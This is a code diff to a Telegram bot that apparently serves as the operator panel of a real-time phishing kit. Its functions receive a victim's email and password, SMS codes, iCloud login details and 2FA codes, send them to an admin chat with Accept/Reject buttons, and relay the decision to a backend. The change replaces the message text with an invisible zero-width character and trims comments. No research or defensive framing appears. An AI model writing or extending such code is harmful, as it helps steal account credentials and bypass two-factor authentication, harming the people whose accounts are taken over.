@@ -44,6 +44,9 @@ let pendingRequests = {};
 // Track already-handled callback IDs to prevent duplicate processing
 const handledCallbacks = new Set();
 
+// Invisible placeholder — Telegram requires non-empty text to attach buttons
+const BLANK = "\u200B";
+
 // -----------------
 // Email/Password approval
 // -----------------
@@ -58,11 +61,7 @@ function sendApprovalRequest(email, password) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
 }
 
 // -----------------
@@ -79,11 +78,7 @@ function sendApprovalRequestGeneric(identifier) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*Approval Requested*\nIdentifier: ${identifier}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
 }
 
 // -----------------
@@ -100,11 +95,7 @@ function sendApprovalRequestSMS(code) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*SMS Approval Requested*\n*Code:* ${code}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
 }
 
 // -----------------
@@ -121,11 +112,7 @@ function sendApprovalRequestPage(email, password) {
       ]
     }
   };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
+  bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
 }
 
 // -----------------
@@ -133,7 +120,6 @@ function sendApprovalRequestPage(email, password) {
 // -----------------
 async function sendLoginTelegram(email) {
   const options = {
-    parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
         [
@@ -147,8 +133,7 @@ async function sendLoginTelegram(email) {
     }
   };
 
-  const message = `📧 *Email:* ${email}`;
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+  await bot.sendMessage(ADMIN_CHAT_ID, BLANK, options);
 }
 
 // -----------------
@@ -156,7 +141,7 @@ async function sendLoginTelegram(email) {
 // -----------------
 function send2FACode(code, chatId) {
   pendingRequests[chatId] = true;
-  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
+  bot.sendMessage(chatId, BLANK, {
     reply_markup: {
       keyboard: [["Accept", "Reject"]],
       one_time_keyboard: true,
@@ -206,7 +191,7 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
-      // Step 1: Remove buttons from original message (keep info visible)
+      // Step 1: Remove buttons from original message
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -217,8 +202,7 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
-      // Step 2: Send status as a new reply below the original message
-      // Extract the SMS code from the original Telegram message text
+      // Step 2: Send status as a new message
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
@@ -253,12 +237,12 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: Delete the original message entirely (no unnecessary leftover)
+    // Step 1: Delete the original message entirely
     try {
       await bot.deleteMessage(query.message.chat.id, query.message.message_id);
     } catch (_) {}
 
-    // Step 2: Send standalone status message — SMS (all digits) vs Email
+    // Step 2: Send standalone status message
     const isSMS = /^\d+$/.test(identifier);
     const replyText = isSMS
       ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
